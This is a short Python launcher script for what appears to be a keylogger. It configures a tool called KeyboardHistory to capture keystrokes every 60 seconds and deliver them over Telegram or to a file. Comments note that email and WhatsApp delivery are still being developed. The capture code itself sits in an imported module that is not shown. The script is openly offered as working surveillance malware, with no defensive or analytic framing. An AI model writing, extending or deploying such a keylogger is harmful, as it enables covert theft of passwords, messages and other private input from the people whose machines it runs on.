import keyboard_history

#### YOUR OPTIONS ####
LOG_EVERY = 60 # Set interval time log (second)
METHOD = "telegram" # Method : telegram, file
######################
# email and whatsapp in development:>
######################

if __name__ == "__main__":
    keyboardHistory = keyboard_history.KeyboardHistory(interval=LOG_EVERY,method=METHOD)
    keyboardHistory.run()
